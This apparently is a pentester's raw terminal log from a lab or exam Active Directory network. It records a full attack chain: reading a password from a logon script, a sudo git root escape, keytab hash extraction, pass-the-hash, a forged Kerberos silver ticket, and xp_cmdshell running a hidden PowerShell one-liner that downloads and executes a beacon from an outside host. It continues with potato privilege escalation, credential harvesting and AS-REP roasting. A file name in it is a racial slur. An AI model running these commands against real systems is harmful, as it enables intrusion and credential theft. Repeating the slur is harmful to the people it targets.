
```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.3.10.11      josa.local DC01.josa.local
10.129.221.89   mail.outbound.htb
10.3.10.11      JOSA.LOCAL josa.local
10.3.10.204     dev.josa.local dev
240.0.0.1     AWSJPDC0522.shibuya.vl shibuya.vl AWSJPDC0522
10.129.214.83   voleur.htb DC.voleur.htb
10.129.242.58     dc01.mirage.htb mirage.htb dc01
10.30.10.101     DEV01.andromeda.exam DEV01
10.30.10.100     DC01.andromeda.exam andromeda.exam DC01
10.30.10.102     SRV02.andromeda.exam SRV02
10.30.10.103     SRV01.andromeda.exam SRV01
```


## Authenticated enumeration


```
kali@kali ~/w/a/w200> ldapsearch -x -H ldap://dc01.andromeda.exam -D 'ANDROMEDA\async_pentester-1' -w '4SynC-s3cur1ty-l4bs' -b "DC=andromeda,DC=exam" "(objectClass=computer)" dNSHostName | grep "^dNSHostName" | cut -d' ' -f2-
DC01.andromeda.exam
DEV01.andromeda.exam
SRV02.andromeda.exam
SRV01.andromeda.exam
```



```
kali@kali ~/w/a/w200> ldapsearch -x -H ldap://dc01.andromeda.exam -D 'ANDROMEDA\async_pentester-1' -w '4SynC-s3cur1ty-l4bs' -b "DC=andromeda,DC=exam" "(objectClass=computer)" dNSHostName | grep "^dNSHostName" | cut -d' ' -f2- | xargs -I {} sh -c 'ip=$(dig {} @dc01.andromeda.exam +short); echo "$ip {}"'
10.30.10.100 DC01.andromeda.exam
10.30.10.101 DEV01.andromeda.exam
10.30.10.102 SRV02.andromeda.exam
10.30.10.103 SRV01.andromeda.exam
```



```
kali@kali ~/w/a/w200> nxc smb DC01  -u 'async_pentester-1' -p '4SynC-s3cur1ty-l4bs' --pass-pol
SMB         10.30.10.100    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.100    445    DC01             [+] andromeda.exam\async_pentester-1:4SynC-s3cur1ty-l4bs 
SMB         10.30.10.100    445    DC01             [+] Dumping password info for domain: andromeda
SMB         10.30.10.100    445    DC01             Minimum password length: 7
SMB         10.30.10.100    445    DC01             Password history length: 24
SMB         10.30.10.100    445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.30.10.100    445    DC01             
SMB         10.30.10.100    445    DC01             Password Complexity Flags: 000000
SMB         10.30.10.100    445    DC01                 Domain Refuse Password Change: 0
SMB         10.30.10.100    445    DC01                 Domain Password Store Cleartext: 0
SMB         10.30.10.100    445    DC01                 Domain Password Lockout Admins: 0
SMB         10.30.10.100    445    DC01                 Domain Password No Clear Change: 0
SMB         10.30.10.100    445    DC01                 Domain Password No Anon Change: 0
SMB         10.30.10.100    445    DC01                 Domain Password Complex: 0
SMB         10.30.10.100    445    DC01             
SMB         10.30.10.100    445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.30.10.100    445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.30.10.100    445    DC01             Locked Account Duration: 30 minutes 
SMB         10.30.10.100    445    DC01             Account Lockout Threshold: None
SMB         10.30.10.100    445    DC01             Forced Log off Time: Not Set

```



```
kali@kali ~/w/a/w200> nxc smb 10.30.10.0/24 -u 'async_pentester-1' -p '4SynC-s3cur1ty-l4bs' --shares
SMB         10.30.10.100    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.102    445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.101    445    DEV01            [*] Windows Server 2022 Build 20348 x64 (name:DEV01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.100    445    DC01             [+] andromeda.exam\async_pentester-1:4SynC-s3cur1ty-l4bs 
SMB         10.30.10.102    445    SRV02            [-] Broken Pipe Error while attempting to login
SMB         10.30.10.101    445    DEV01            [+] andromeda.exam\async_pentester-1:4SynC-s3cur1ty-l4bs 
SMB         10.30.10.100    445    DC01             [*] Enumerated shares
SMB         10.30.10.100    445    DC01             Share           Permissions     Remark
SMB         10.30.10.100    445    DC01             -----           -----------     ------
SMB         10.30.10.100    445    DC01             ADMIN$                          Remote Admin
SMB         10.30.10.100    445    DC01             C$                              Default share
SMB         10.30.10.100    445    DC01             IPC$            READ            Remote IPC
SMB         10.30.10.100    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.30.10.100    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.30.10.101    445    DEV01            [*] Enumerated shares
SMB         10.30.10.101    445    DEV01            Share           Permissions     Remark
SMB         10.30.10.101    445    DEV01            -----           -----------     ------
SMB         10.30.10.101    445    DEV01            ADMIN$                          Remote Admin
SMB         10.30.10.101    445    DEV01            C$                              Default share
SMB         10.30.10.101    445    DEV01            intern-mgmt                     Intern Management Share
SMB         10.30.10.101    445    DEV01            IPC$            READ            Remote IPC
SMB         10.30.10.101    445    DEV01            scripts                         Scripts used by Andromeda Devs
SMB         10.30.10.101    445    DEV01            tickets                         Output share for tickets opened by Andromeda Webhook
```




```
kali@kali ~/w/a/w200> cat /home/kali/.nxc/modules/nxc_spider_plus/10.30.10.100.json
{
    "NETLOGON": {
        "connection_test.ps1": {
            "atime_epoch": "2025-07-28 15:57:08",
            "ctime_epoch": "2025-07-28 15:57:08",
            "mtime_epoch": "2025-07-28 15:57:07",
            "size": "622 B"
        }
    },
    "SYSVOL": {
        "andromeda.exam/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2025-07-28 16:04:14",
            "ctime_epoch": "2025-07-28 14:29:31",
            "mtime_epoch": "2025-07-28 16:04:14",
            "size": "22 B"
        },
        "andromeda.exam/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-07-28 14:33:23",
            "ctime_epoch": "2025-07-28 14:29:31",
            "mtime_epoch": "2025-07-28 14:33:23",
            "size": "1.07 KB"
        },
        "andromeda.exam/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2025-07-28 16:04:14",
            "ctime_epoch": "2025-07-28 16:04:14",
            "mtime_epoch": "2025-07-28 16:04:14",
            "size": "2.74 KB"
        },
        "andromeda.exam/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2025-07-28 14:47:37",
            "ctime_epoch": "2025-07-28 14:29:31",
            "mtime_epoch": "2025-07-28 14:47:37",
            "size": "22 B"
        },
        "andromeda.exam/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-07-28 14:47:37",
            "ctime_epoch": "2025-07-28 14:29:31",
            "mtime_epoch": "2025-07-28 14:47:37",
            "size": "4.43 KB"
        },
        "andromeda.exam/scripts/connection_test.ps1": {
            "atime_epoch": "2025-07-28 15:57:08",
            "ctime_epoch": "2025-07-28 15:57:08",
            "mtime_epoch": "2025-07-28 15:57:07",
            "size": "622 B"
        }
    }
}⏎                                                                                                                                                                                                                  kali@kali ~/w/a/w200> 

```




```
kali@kali ~/.n/m/n/1/NETLOGON> cat connection_test.ps1 
#!/usr/bin/env pwsh
$username = 'j.wilson'
$plainPassword = 'IKYqVjwGiW0z'
$securePwd = ConvertTo-SecureString $plainPassword -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $securePwd)
Import-Module Posh-SSH -ErrorAction Stop
try {
    $session = New-SSHSession `
      -ComputerName 'SRV01.andromeda.exam' `
      -Credential $cred `
      -ErrorAction Stop
    Write-Host "SSH is working on SRV01"
}
catch {
    Write-Host "SSH connection failed:" $_.Exception.Message
    exit 1
}
finally {
    if ($session) {
        Remove-SSHSession -SessionId $session.SessionId
    }
}
kali@kali ~/.n/m/n/1/NETLOGON> 
```





```
kali@kali ~/.n/m/n/1/NETLOGON> ssh j.wilson@SRV01.andromeda.exam 
The authenticity of host 'srv01.andromeda.exam (10.30.10.103)' can't be established.
ED25519 key fingerprint is SHA256:e7tYsG5XpD5AkSQ1KHelbRbjN0jne5LH6gCPbwyoWsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'srv01.andromeda.exam' (ED25519) to the list of known hosts.
j.wilson@srv01.andromeda.exam's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Jul 29 02:30:44 AM +08 2025

  System load:  0.0                Processes:              124
  Usage of /:   3.9% of 195.80GB   Users logged in:        0
  Memory usage: 7%                 IPv4 address for ens18: 10.30.10.103
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

82 updates can be applied immediately.
32 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

New release '24.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

j.wilson@SRV01:~$ 

```



```
j.wilson@SRV01:~$ sudo git -p help config                                                                                                                                                             18:33:30 [7/7]
GIT-CONFIG(1)                                                                                     Git Manual                                                                                     GIT-CONFIG(1)
NAME                                                                                                                                                                                                                
       •   you try to unset an option which does not exist (ret=5),
                                                     
       •   you try to unset/set an option for which multiple lines match (ret=5), or                                                                                                                                
                                                     
!/bin/sh
# 
# id
uid=0(root) gid=0(root) groups=0(root)
# file /etc/krb5.keytab
/etc/krb5.keytab: Kerberos Keytab file, realm=ANDROMEDA.EXAM, principal=SRV01$/, type=92295, date=Sat Sep 20 22:06:56 2053, kvno=23
```





```
!/bin/sh
# 
# id
uid=0(root) gid=0(root) groups=0(root)
# file /etc/krb5.keytab
/etc/krb5.keytab: Kerberos Keytab file, realm=ANDROMEDA.EXAM, principal=SRV01$/, type=92295, date=Sat Sep 20 22:06:56 2053, kvno=23
# 

```




```
# ls -la
total 52
drwxrwxrwt 12 root     root         4096 Jul 29 02:30 .
drwxr-xr-x 20 root     root         4096 Jun 24 21:10 ..
drw-------  2 root     root         4096 Jul 29 00:09 adcli-krb5-oOJP5G
drwxrwxrwt  2 root     root         4096 Jul 28 22:18 .font-unix
drwxrwxrwt  2 root     root         4096 Jul 28 22:18 .ICE-unix
-rw-------  1 j.wilson domain users 1414 Jul 29 02:30 krb5cc_550601381_XXXXVQ17gA
drwx------  3 root     root         4096 Jul 28 22:18 snap-private-tmp
drwx------  3 root     root         4096 Jul 28 22:18 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-ModemManager.service-zdAiYq
drwx------  3 root     root         4096 Jul 28 22:18 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-systemd-logind.service-Ql33cS
drwx------  3 root     root         4096 Jul 28 23:37 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-upower.service-tHwyZ0
drwxrwxrwt  2 root     root         4096 Jul 28 22:18 .Test-unix
drwxrwxrwt  2 root     root         4096 Jul 28 22:18 .X11-unix
drwxrwxrwt  2 root     root         4096 Jul 28 22:18 .XIM-unix
```




```
# cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
# ls
adcli-krb5-oOJP5G  krb5cc_550601381_XXXXVQ17gA  systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-ModemManager.service-zdAiYq    systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-upower.service-tHwyZ0
bash               snap-private-tmp             systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-systemd-logind.service-Ql33cS
# ls -la
total 1416
drwxrwxrwt 12 root     root            4096 Jul 29 02:38 .
drwxr-xr-x 20 root     root            4096 Jun 24 21:10 ..
drw-------  2 root     root            4096 Jul 29 00:09 adcli-krb5-oOJP5G
-rwsr-xr-x  1 root     root         1396520 Jul 29 02:38 bash
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .font-unix
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .ICE-unix
-rw-------  1 j.wilson domain users    1414 Jul 29 02:30 krb5cc_550601381_XXXXVQ17gA
drwx------  3 root     root            4096 Jul 28 22:18 snap-private-tmp
drwx------  3 root     root            4096 Jul 28 22:18 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-ModemManager.service-zdAiYq
drwx------  3 root     root            4096 Jul 28 22:18 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-systemd-logind.service-Ql33cS
drwx------  3 root     root            4096 Jul 28 23:37 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-upower.service-tHwyZ0
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .Test-unix
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .X11-unix
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .XIM-unix

```


```
bash-5.1# find / -name '*.keytab' 2>/dev/null
/home/o.lockwood/svc_sharepoint.keytab
/home/o.lockwood/svc_sql.keytab
/home/o.lockwood/svc_iis.keytab
/etc/krb5.keytab

```


```
kali@kali ~/w/a/w200> python kt.py svc_sql.keytab

svc_sql@andromeda.exam
    RC4_HMAC: 36d228aa432061d529501af0d15c9543
kali@kali ~/w/a/w200> python kt.py svc_iis.keytab 

svc_iis@andromeda.exam
    RC4_HMAC: 5607525c2ec20ec1ba786624dcfd5cbf
kali@kali ~/w/a/w200> python kt.py svc_sharepoint.keytab 

svc_sharepoint@andromeda.exam
    RC4_HMAC: d8327b0d19ff7bfefa913ac9e9b6f6a6

```



```
kali@kali ~/w/a/w200> nxc smb DC01 -u 'svc_sharepoint' -H 'd8327b0d19ff7bfefa913ac9e9b6f6a6'
SMB         10.30.10.100    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.100    445    DC01             [+] andromeda.exam\svc_sharepoint:d8327b0d19ff7bfefa913ac9e9b6f6a6 
kali@kali ~/w/a/w200> nxc smb DC01 -u 'svc_iis' -H '5607525c2ec20ec1ba786624dcfd5cbf'
SMB         10.30.10.100    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.100    445    DC01             [+] andromeda.exam\svc_iis:5607525c2ec20ec1ba786624dcfd5cbf 
kali@kali ~/w/a/w200> nxc smb DC01 -u 'svc_sql' -H '36d228aa432061d529501af0d15c9543'
SMB         10.30.10.100    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.100    445    DC01             [+] andromeda.exam\svc_sql:36d228aa432061d529501af0d15c9543 

```



```
kali@kali ~/w/a/w200> mssqlclient.py andromeda.exam/svc_sql@10.30.10.100 -hashes ':36d228aa432061d529501af0d15c9543' -windows-auth
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (andromeda\svc_sql  guest@master)> 
```


```
SQL (andromeda\svc_sql  guest@master)> use msdb
ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
SQL (andromeda\svc_sql  guest@msdb)> !
SQL (andromeda\svc_sql  guest@msdb)> xp_cmdshell
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (andromeda\svc_sql  guest@msdb)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (andromeda\svc_sql  guest@msdb)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (andromeda\svc_sql  guest@msdb)> enum_logins
name                     type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
----------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                       SQL_LOGIN                 1          1               0             0            0              0           0           0           0   

ANDROMEDA\Domain Users   WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   

SQL (andromeda\svc_sql  guest@msdb)> enum_logins
name                     type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
----------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                       SQL_LOGIN                 1          1               0             0            0              0           0           0           0   

ANDROMEDA\Domain Users   WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   

```


```
SQL (andromeda\svc_sql  guest@msdb)> SELECT name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb     


```



```
SQL (andromeda\svc_sql  guest@msdb)> SELECT name FROM sys.tables;
name                                
---------------------------------   
dm_hadr_automatic_seeding_history   

backupmediaset                      

backupmediafamily                   

backupset                           

backupfile                          

restorehistory                      

restorefile                         

restorefilegroup                    

logmarkhistory                      

suspect_pages                       

```




```
kali@kali ~/w/a/w200> mssqlclient.py andromeda.exam/svc_sql@10.30.10.103 -hashes ':36d228aa432061d529501af0d15c9543' -windows-auth
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Traceback (most recent call last):
  File "/home/kali/.local/bin/mssqlclient.py", line 96, in <module>
    ms_sql.connect()
    ~~~~~~~~~~~~~~^^
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/tds.py", line 540, in connect
    sock.connect(sa)
    ~~~~~~~~~~~~^^^^
ConnectionRefusedError: [Errno 111] Connection refused

```



https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver


```
kali@kali ~/w/a/w200> ticketer.py -spn 'MSSQLSvc/SRV02.andromeda.exam' -domain 'andromeda.exam' -domain-sid 'S-1-5-21-2119499052-3001082412-882273484' -nthash '36d228aa432061d529501af0d15c9543' Administrator

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for andromeda.exam/Administrator
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/home/kali/.local/bin/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache

```



```
export KRB5CCNAME=Administrator.ccache


mssqlclient.py -k -no-pass SRV02.andromeda.exam

SQL (ANDROMEDA.EXAM\Administrator  dbo@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor                        
----------   --------   ---------------   ----------   --------   ----------------------------   
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser   
```




```
SQL (ANDROMEDA.EXAM\Administrator  dbo@master)> enable_xp_cmdshell
INFO(SRV02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(SRV02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

```



```
SQL (ANDROMEDA.EXAM\Administrator  dbo@master)> xp_cmdshell whoami /all                                                                                                                                             
output                                                                                                                                                                                                              
--------------------------------------------------------------------------------                                                                                                                                    
NULL                                                                                                                                                                                                                
                                                                                                                                                                                                                    
USER INFORMATION                                                                                                                                                                                                    
                                                                                                                                                                                                                    
----------------                                                                                                                                                                                                    
                                                                                                                                                                                                                    
NULL                                                                                                                                                                                                                
                                                                                                                                                                                                                    
User Name         SID                                                                                                                                                                                               
                                                                                                                                                                                                                    
================= =============================================                                                                                                                                                     
                                                                                                                                                                                                                    
andromeda\svc_sql S-1-5-21-2119499052-3001082412-882273484-1382                                                                                                                                                     
                                                                                                                                                                                                                    
NULL                                                                                                                                                                                                                
                                                                                                                                                                                                                    
NULL                                                                                                                                                                                                                
                                                                                                                                                                                                                    
GROUP INFORMATION                                                                                                                                                                                                   
                                                                                                                                                                                                                    
-----------------                                                                                                                                                                                                   
                                                                                                                                                                                                                    
NULL                                                                                                                                                                                                                
                                                                                                                                                                                                                    
Group Name                                 Type             SID                                                             Attributes                                                                              
                                                                                                                                                                                                                    
========================================== ================ =============================================================== ==================================================                                      
                                                                                                                                                                                                                    
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group                                      
                                                                                                                                                                                                                    
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group                                      
                                                                                                                                                                                                                    
BUILTIN\Performance Monitor Users          Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group                                      
                                                                                                                                                                                                                    
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group                                      
                                                                                                                                                                                                                    
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group                                      
                                                                                                                                                                                                                    
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group                                      
                                                                                                                                                                                                                    
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group                                      
                                                                                                                                                                                                                    
NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner                                          

LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group   

Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group   

Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                          

```

```
SQL (ANDROMEDA.EXAM\Administrator  dbo@master)> EXEC xp_cmdshell 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://10.15.0.2:80/beacon.ps1'')"';

```

```
[07/29 07:33:08] beacon> upload /home/kali/work/async/w200/beacon_x64.exe
[07/29 07:33:09] [*] Tasked beacon to upload /home/kali/work/async/w200/beacon_x64.exe as beacon_x64.exe
[07/29 07:33:12] [+] host called home, sent: 328730 bytes
[07/29 07:33:28] beacon> run .\DeadPotato-NET4.exe -exe beacon_x64.exe
[07/29 07:33:28] [*] Tasked beacon to run: .\DeadPotato-NET4.exe -exe beacon_x64.exe
[07/29 07:33:32] [+] host called home, sent: 59 bytes
[07/29 07:33:42] [+] received output:
      _.--,_
   .-'      '-.          _           _ 
  /            \        | \ _  _  _||_) _ _|_ _ _|_ _ 
 '          _.  '       |_/(/_(_|(_||  (_) |_(_| |_(_)
 \      """" /  ~(      Open Source @ github.com/lypd0
  '=,,_ =\__ `  &             -= Version: 1.2 =-
        ""  ""'; \\\ 


_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

(*) Initiating procedure as NT AUTHORITY\NETWORK SERVICE
(+) Is impersonation possible in current context? YES
(+) Currently running as user: NT AUTHORITY\SYSTEM
(+) Elevated process started with PID 664

-={          OUTPUT BELOW         }=-

```



```
    LastWritten      : 7/28/2025 11:57:53 PM
    TargetName       : Domain:batch=TaskScheduler:Task:{932E179B-CE7C-40FD-8AEF-E8ED3A7B908B}
    TargetAlias      : 
    Comment          : 
    UserName         : andromeda\e.harris
    Credential       : y5valnF0fa9d


```




```
kali@kali ~/w/a/w200> nxc smb 10.30.10.103 -u 'e.harris' -p 'y5valnF0fa9d' --shares
SMB         10.30.10.101    445    DEV01            [*] Windows Server 2022 Build 20348 x64 (name:DEV01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.101    445    DEV01            [+] andromeda.exam\e.harris:y5valnF0fa9d 
SMB         10.30.10.101    445    DEV01            [*] Enumerated shares
SMB         10.30.10.101    445    DEV01            Share           Permissions     Remark
SMB         10.30.10.101    445    DEV01            -----           -----------     ------
SMB         10.30.10.101    445    DEV01            ADMIN$                          Remote Admin
SMB         10.30.10.101    445    DEV01            C$                              Default share
SMB         10.30.10.101    445    DEV01            intern-mgmt     READ,WRITE      Intern Management Share
SMB         10.30.10.101    445    DEV01            IPC$            READ            Remote IPC
SMB         10.30.10.101    445    DEV01            scripts         READ,WRITE      Scripts used by Andromeda Devs
SMB         10.30.10.101    445    DEV01            tickets         READ,WRITE      Output share for tickets opened by Andromeda Webhook
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```


```
kali@kali ~/.n/m/n/1/tickets> cat IMPORTANT.txt 
@Kyle, please take a look at #1028. Looks like something in your app broke
```



```
        "ticketNum": 1028,
        "ticketFlags": [
            "high_priority",
            "sharepoint",
            "timeout",
            "authentication"
        ],
        "ticketContent": "Timed out when connecting to https://andromeda.sharepoint.com/sites/mgmt using provided credentials 'k.clark : TKrfQJIjKp28'. ConnectTimeoutError: HTTPSConnectionPool(host='andromeda.sharepoint.com', port=443): Max retries exceeded with url: /sites/mgmt (Caused by ConnectTimeoutError(<urllib3.connection.VerifiedHTTPSConnection object at 0x7f8c4a2e1c10>, 'Connection to https://andromeda.sharepoint.com/sites/mgmt timed out'))",
        "ticketStatus": "open"
```



```
kali@kali ~> bloodyAD --host 10.30.10.100 -d andromeda -u k.clark -p TKrfQJIjKp28 add groupMember IT async_pentester-1 
[+] async_pentester-1 added to IT
```

## Targetted AS-REPRoast


```
kali@kali ~/w/a/w200> nxc ldap 10.30.10.100 -u 'async_pentester-1' -p '4SynC-s3cur1ty-l4bs' --asreproast nigger.txt 
LDAP        10.30.10.100    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:andromeda.exam) (signing:None) (channel binding:No TLS cert) 
LDAP        10.30.10.100    389    DC01             [+] andromeda.exam\async_pentester-1:4SynC-s3cur1ty-l4bs 
LDAP        10.30.10.100    389    DC01             [*] Total of records returned 1
LDAP        10.30.10.100    389    DC01             $krb5asrep$23$j.hernandez@ANDROMEDA.EXAM:f581a62ff0a3edc8c84cdc26a895c1e9$87f18798621bce68bf173e8f8f9b8b2ac27d74877a8bf3962202dbc4008be059f54e93b42dbd3277ec64ba7959c6380d98a8e68719dd2eff60fa5dbbdb090984c8da91d8c9c91a124e9208ebecfb9852c41a9864296cdd325a2d1c96fa20dffb93a6ef9c7a5674c9a4e6b3472c7cfb08305defc6155b8cde8bd76f2b189c9b8df3455d9febfd9e8411a53135a8ae607c15a79a8364c9a78510b94f9a0e2c717bb234dfd27bd5647a21dd775b7a0df1fde089ce673e25162de58eacfef42b56d1ff0bc2488c18339238e34e9240ba2da5ae7528d04e021d41e1bdbc9aaee1be6e2f3aaad403d1ec248a7023999c6383fb

```


```python
kali@kali ~/w/a/w200> hashcat -m 18200 -a 0 nigger.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400F, 2913/5890 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
